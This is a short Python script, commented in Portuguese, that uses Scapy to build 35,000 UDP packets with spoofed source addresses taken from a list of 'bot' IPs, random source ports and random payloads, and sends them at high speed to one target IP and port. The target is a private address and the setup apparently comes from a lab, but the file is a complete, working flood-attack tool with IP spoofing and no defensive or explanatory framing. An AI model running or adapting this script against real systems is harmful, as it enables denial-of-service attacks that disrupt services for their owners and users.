from scapy.all import *
import scapy
import random
import time
import sys
import ipaddress

# Ataque simples UDP Flood, com tamanho do payload aleatório e
# string aleatória como carga.
# IP Spoofing, RandomSRCPort e 3000 bots.

# CONFIGURAÇÃO DO ATAQUE
TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"
PACKET_PAYLOAD_MIN_SIZE = 64
PACKET_PAYLOAD_MAX_SIZE = 512
SEND_INTERVAL = 0.001

def load_bots(filename):
    """Colocar os bots do arquivo em uma lista."""
    bot_ips = []

    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)

    return bot_ips

def run_udp_flood_attack():
    """UDP Flood Attack"""
    bot_ips = load_bots(BOTFILE)

    numero_de_pacotes_enviados = 0

    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)

        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)

        paylaod_size = random.randint(PACKET_PAYLOAD_MIN_SIZE, PACKET_PAYLOAD_MAX_SIZE)
        payload = RandString(size=paylaod_size)

        packet = eth_layer / ip_layer / udp_layer / Raw(load=RandString(size=paylaod_size))
        #print(f"Pacote {numero_de_pacotes_enviados + 1} (Sumário): {packet.summary()}")

        #print(f"Pacote {numero_de_pacotes_enviados + 1} (Show2 - como seria enviado):")
        #packet.show2()

        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if(numero_de_pacotes_enviados == 35000):
            break


    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")



if __name__ == "__main__":
    run_udp_flood_attack()
